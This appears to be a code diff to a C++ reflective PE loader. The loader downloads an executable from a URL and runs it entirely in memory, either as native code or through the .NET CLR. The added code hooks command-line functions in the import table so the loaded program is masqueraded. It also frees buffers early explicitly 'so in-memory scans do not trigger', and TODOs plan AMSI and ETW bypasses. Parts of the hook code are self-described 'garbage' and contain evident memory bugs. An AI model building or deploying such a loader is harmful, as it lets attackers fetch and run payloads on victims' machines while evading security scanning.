@@ -14,14 +14,16 @@
 #import <mscorlib.tlb> raw_interfaces_only			\
     	high_property_prefixes("_get","_put","_putref")		\
     	rename("ReportEvent", "InteropServices_ReportEvent")	\
-		rename("or", "InteropServices_or") // rename so c# symbols do not overwrite C++ functions/symbols
+		rename("or", "InteropServices_or") // rename for c# symbols to not overwrite C++ functions/symbols
 
-// TODO: IAT hooking for arguments for both current process(affects CLR) and native loader
-// TODO: native exit function exits out of current process, hook this and fix
+// TODO: native ExitThread function exits out of current process, hook this and fix
 // TODO: AMSI bypass before loading managed
 // TODO: ETW bypass 
 // TODO: implement [smart rebase](https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/)
 // TODO: parse headers and allocate straight from HTTP download 
+// TODO: find argv/argc get functions for other native C++ compilers, 
+//		 tested: cl.exe (non-multithreaded) __p__argv
+//		 untested: __getmainargs, __getcmdln, Environment.GetCommandLineArgs
 
 // download file from url, returns buffer to file
 char* httpStage(LPCSTR urlStr,size_t &out_size) {
@@ -192,6 +194,145 @@ DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
 	return 0;
 }
 
+// converts LPWSTR to LPSTR (lpwszStr = long pointer wide char zero-terminated string)
+// !memory management for return value is responsibility of caller!
+void wideToNarrowStr(LPWSTR lpwszStr, LPSTR* ppszStr) {
+	// get LPWSTR size
+    int nSize = WideCharToMultiByte(CP_ACP, 0, lpwszStr, -1, NULL, 0, NULL, NULL);
+	// allocate LPSTR*
+    *ppszStr = (LPSTR)malloc(nSize);
+	// write narrow converted chars to LPSTR*
+    WideCharToMultiByte(CP_ACP, 0, lpwszStr, -1, *ppszStr, nSize, NULL, NULL);
+}
+
+// --- WARNING THIS IS GARBAGE CODE (c string manipulation + wide to narrow string conversion is a nightmare) ---
+// visual studio cl.exe compile uses __p___argc and __p___argv to retrieve commandline
+char*** __p___argvHook() {
+	// using GetCommandLineW because win32 has not implemented a CommandLineToArgvA function
+	LPWSTR cmdLine = GetCommandLineW();  // not affected by the IAT hook because function address points to seperate IAT table
+	int argc; // Allocate memory for an int variable
+	LPWSTR* lpCmdLine = CommandLineToArgvW(cmdLine, &argc);
+
+	// convert LPWSTR* to LPSTR*
+	LPSTR* argv = (LPSTR*)malloc(argc * sizeof(LPSTR));
+	for (int i = 0; i < argc; i++) {
+        wideToNarrowStr(lpCmdLine[i], &argv[i]);
+    }
+
+	// remove the second argument from the array
+	if (argc > 1) { 
+		for (int i = 2; i < argc; i++) {
+			argv[i-1] = argv[i];
+		}
+	}
+	LocalFree(lpCmdLine);
+
+	char*** ppargv = (char***)malloc(sizeof(char*));
+	ppargv = &argv;
+	return ppargv;
+}
+int* __p___argcHook() {
+	// using GetCommandLineW because win32 has not implemented a CommandLineToArgvA function
+	LPWSTR cmdLine = GetCommandLineW();  // not affected by the IAT hook because function address points to seperate IAT table
+	int* argc = (int*) malloc(sizeof(int)); // Allocate memory for an int variable
+	LPWSTR* argv = CommandLineToArgvW(cmdLine, argc);
+	LocalFree(argv);
+
+	// remove url argument
+	*argc = *argc - 1;
+
+	return argc;
+}
+// if hook is called repeatedly, may cause memory leak due to return value malloc
+// !will not put quotes around arguments containing spaces!
+LPSTR GetCommandLineAHook() {
+	LPWSTR cmdLine = GetCommandLineW();  // not affected by the IAT hook because function address points to seperate IAT table
+	int argc;
+	LPWSTR* argv = CommandLineToArgvW(cmdLine, &argc);
+
+	// remove the second argument from the array
+	if (argc > 1) { 
+		for (int i = 2; i < argc; i++) {
+			argv[i-1] = argv[i];
+		}
+		argc--;
+	}
+
+	// allocate buf
+	size_t totalLen = 0;
+	for (int i = 0; i < argc; i++) {
+		totalLen += wcslen(argv[i]) + 1; // add 1 for the space character
+		
+		if (wcschr(argv[i], L' ') != nullptr) { totalLen += 2; } // if argument contains a space, make room for quotes
+	}
+	LPWSTR combined = (LPWSTR)malloc(totalLen * sizeof(WCHAR));
+	combined[0] = NULL;
+
+	// combine the remaining arguments into a single string
+	for (int i = 0; i < argc; i++) {
+		if (i != 0) { wcscat_s(combined, totalLen, L" "); }
+		if (wcschr(argv[i], L' ') != nullptr) { 
+			wcscat_s(combined, totalLen, L"\"");
+			wcscat_s(combined, totalLen, argv[i]);
+			wcscat_s(combined, totalLen, L"\"");
+		}
+		else {
+			wcscat_s(combined, totalLen, argv[i]);
+		}
+	}
+
+	// free the memory from CommandLineToArgvW
+	LocalFree(argv);
+
+	// calculate the required buffer size for the converted string
+	int wideStrLen = wcslen(combined);
+	int bufferSize = WideCharToMultiByte(CP_UTF8, 0, combined, wideStrLen, NULL, 0, NULL, NULL);
+
+	// allocate a buffer for the converted string
+	LPSTR narrowStr = (LPSTR)malloc(bufferSize + 1); // add 1 for null terminator
+	narrowStr[0] = NULL;
+
+	// convert the wide string to a narrow string
+	WideCharToMultiByte(CP_UTF8, 0, combined, wideStrLen, narrowStr, bufferSize, NULL, NULL);
+	narrowStr[bufferSize] = '\0'; // add null terminator
+	free(combined);
+
+	return narrowStr;
+}
+LPWSTR GetCommandLineWHook() {
+	LPWSTR cmdLine = GetCommandLineW();
+	int argc;
+	LPWSTR* argv = CommandLineToArgvW(cmdLine, &argc);
+
+	// remove the second argument from the array
+	if (argc > 1) {
+		for (int i = 2; i < argc; i++) {
+			argv[i-1] = argv[i];
+		}
+		argc--;
+	}
+
+	// allocate buf
+	size_t totalLen = 0;
+	for (int i = 0; i < argc; i++) {
+		totalLen += wcslen(argv[i]) + 1; // add 1 for the space character
+	}
+	LPWSTR combined = (LPWSTR)malloc(totalLen * sizeof(WCHAR));
+	combined = NULL;
+
+	// combine the remaining arguments into a single string
+	for (int i = 0; i < argc; i++) {
+		if (i != 0) { wcscat_s(combined, totalLen, L" "); }
+		wcscat_s(combined, totalLen, argv[i]);
+	}
+
+	// free the memory from CommandLineToArgvW
+	LocalFree(argv);
+
+	return combined;
+}
+// --- END OF GARBAGE CODE ---
+
 // import libraries, add function addresses to IAT, and hook commandline functions for masqurading
 DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, bool resolve) {
 	// resolve import address table for current process
@@ -208,7 +349,7 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 		// note: full module PEs are loaded into process memory, export and import tables for specific module can also be read, not just current process
 		library = LoadLibraryA(libraryName);
 
-		// resolve/find all thunks(function addresses/ordinals) and write then to importDescriptor
+		// resolve/find all thunks(function addresses/ordinals) and write them to importDescriptor
 		if (library) {
 			// get first thunk(function) for import dll in current process
 			PIMAGE_THUNK_DATA thunk = NULL, originalThunk = NULL;
@@ -228,7 +369,6 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 						LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
 						thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
 
-
 						// debugging print
 						printf("resolving function(ord) %d -> %x\n", thunk->u1.Ordinal, thunk->u1.Function);
 					}
@@ -236,8 +376,27 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 					if (resolve) {
 						// resolve function address
 						PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)peImageBase + originalThunk->u1.AddressOfData);
-						char* func_name = (char*)&(functionName->Name);
-						DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, func_name);
+
+						// check if we want to IAT hook a function by function name
+						DWORD_PTR functionAddress;
+						if (strcmp(functionName->Name, "GetCommandLineA") == 0) { // IAT Hook GetCommandLineA
+							functionAddress = (DWORD_PTR)GetCommandLineAHook;
+						}
+						else if (strcmp(functionName->Name, "GetCommandLineW") == 0) { // IAT Hook GetCommandLineW
+							functionAddress = (DWORD_PTR)GetCommandLineWHook;
+						}
+						else if (strcmp(functionName->Name, "__p___argv") == 0) { // IAT Hook cl.exe __p___argv
+							functionAddress = (DWORD_PTR)__p___argvHook;
+						}
+						else if (strcmp(functionName->Name, "__p___argc") == 0) { // IAT Hook cl.exe __p___argc
+							functionAddress = (DWORD_PTR)__p___argcHook;
+						}
+						else {
+							char* func_name = (char*)&(functionName->Name);
+							functionAddress = (DWORD_PTR)GetProcAddress(library, func_name);
+						}
+
+						// set function address in IAT
 						thunk->u1.Function = functionAddress;
 
 						// debugging print
@@ -255,13 +414,40 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 	return 0;
 }
 
+// parse NT header from PE file
+IMAGE_NT_HEADERS* getNT(char* peBuffer) {
+	// parse DOS header from PE
+	// https://en.wikipedia.org/wiki/DOS_MZ_executable
+	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peBuffer;
+	// check if file is MS-DOS executable with DOS magic number `5A4D`
+	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+		printf("[!] file is not in PE format. (missing MS-DOS header)\n");
+		return NULL;
+	}
+	// get NT header
+	// https://en.wikipedia.org/wiki/New_Executable
+	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)peBuffer + dosHeader->e_lfanew);
+	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
+		printf("[!] file is not in PE format, meant for DOS mode, and is not a 'New Executable'. (missing NT header)\n");
+		return NULL;
+	}
+
+	return ntHeader;
+}
+
+// load native PE (will free peBuffer during loading)
 // reference: https://github.com/aaaddress1/RunPE-In-Memory Pe Loading
 // 1. copy header and image sections from PE into allocated memory
 // 2. if memory could not be allocated at preferred address, rebase all absolute address in relocation table (`.reloc`)
 // 3. load all libraries/dlls in import address table(IAT) into current process
 // 4. resolve all thunks(pointer to address of function) addresses/ordinals in imported libraries and write into IAT
 // 5. execute PE with entry function
-DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** argv) {
+DWORD loadNative(char* peBuffer, int argc, char** argv) {
+	IMAGE_NT_HEADERS* ntHeader = getNT(peBuffer);
+	if (ntHeader == NULL) {
+		return 1;
+	}
+
 	// get image size
 	SIZE_T imageSize = ntHeader->OptionalHeader.SizeOfImage;
 	// get preferred base address, usually always 0x40000000 in .exe PE files
@@ -295,6 +481,16 @@ DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** ar
 			sectionHeader[i].SizeOfRawData
 		);
 	}
+	
+	// reference headers from allocated memory so buffer can be free'd
+	ntHeader = getNT((char *)peImageBase);
+	if (ntHeader == NULL) {
+		return 1;
+	}
+
+	// free peBuffer so in-memory scans do not trigger
+	free(peBuffer); // if memory created with alloc
+	//VirtualFree(peBuffer,imageSize, MEM_DECOMMIT | MEM_RELEASE); // if memory created with virtualalloc
 
 	// if image is allocated at preferred address, rebasing is not needed
 	if (preferredAddr != peImageBase) {
@@ -311,8 +507,9 @@ DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** ar
 		return 1;
 	}
 
-	// execute PE
+	// get entry address
 	size_t entryAddr = (size_t)(peImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
+	// execute PE
 	((void(*)())entryAddr)();
 
 	// free memory
@@ -411,6 +608,7 @@ HRESULT loadCLR(ICorRuntimeHost** cLRHostPtr) {
 	return S_OK;
 }
 
+// load managed PE (will free code during loading)
 // reference: https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/ .NET V2 loading
 // .NET program is reflectively loaded using COM interop functions
 HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
@@ -450,6 +648,11 @@ HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
 		return E_FAIL;
 	}
 	CopyMemory(safeArray->pvData, code, len);
+
+	// free peBuffer so in-memory scans do not trigger
+	free(code); // if memory created with alloc
+	//VirtualFree(code,len, MEM_DECOMMIT | MEM_RELEASE); // if memory created with virtualalloc
+
 	// load safe array into app domain
 	res = appDomainPtr->Load_3(safeArray, &assemblyPtr);
 	if (FAILED(res)) {
@@ -461,6 +664,12 @@ HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
 	if (FAILED(res)) {
 		return res;
 	}
+
+	// remote second argument from argv
+	for (int i = 2; i < argc; i++) {
+		argv[i-1] = argv[i];
+	}
+	argc--;
 
 	// create COM compatible parameters argv**
 	VARIANT args;
@@ -479,6 +688,7 @@ HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
 		mbstowcs_s(&size, wstr, 256, argv[i], 256-1);
 		SafeArrayPutElement(args.parray, idx, SysAllocString(wstr));
 	}
+
 	// add argument to parameter array for method
 	SAFEARRAY *params = NULL;
 	SAFEARRAYBOUND paramsBound[1];
@@ -526,19 +736,8 @@ HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
 }
 
 DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
-	// parse DOS header from PE
-	// https://en.wikipedia.org/wiki/DOS_MZ_executable
-	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peBuffer;
-	// check if file is MS-DOS executable with DOS magic number `5A4D`
-	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-		printf("[!] file is not in PE format. (missing MS-DOS header)\n");
-		return 1;
-	}
-	// get NT header
-	// https://en.wikipedia.org/wiki/New_Executable
-	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)peBuffer + dosHeader->e_lfanew);
-	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
-		printf("[!] file is not in PE format, meant for DOS mode, and is not a 'New Executable'. (missing NT header)\n");
+	IMAGE_NT_HEADERS* ntHeader = getNT(peBuffer);
+	if (ntHeader == NULL) {
 		return 1;
 	}
 
@@ -548,7 +747,7 @@ DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
 		loadManaged(peBuffer, len, argc, argv);
 	}
 	else {
-		loadNative(peBuffer, ntHeader, argc, argv);
+		loadNative(peBuffer, argc, argv);
 	}
 
 	return 0;
@@ -560,8 +759,6 @@ int main(int argc, char* argv[])
 		printf("Usage: %s http://domain/file.exe [arg...]\n", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
 		return 0;
 	}
-	// Debugging
-	argv[1] = (char*)"http://192.168.72.1:8000/TestAppNative.exe";
 
 	// download PE from url
 	size_t peSize;
@@ -571,15 +768,7 @@ int main(int argc, char* argv[])
 		return 1;
 	}
 
-	argc--;
-	for (int i = 1; i < argc; i++) {
-		argv[i] = argv[i + 1];
-	}
-
 	// call reflectiveLoader
+	// peBuffer is free'd during loading (if peBuffer is allocated using malloc, switch VirtualAlloc() to free())
 	reflectiveLoadPE(peBuffer, peSize, argc, argv);
-
-	// free httpStage allocated mem
-	free(peBuffer);
 }
-
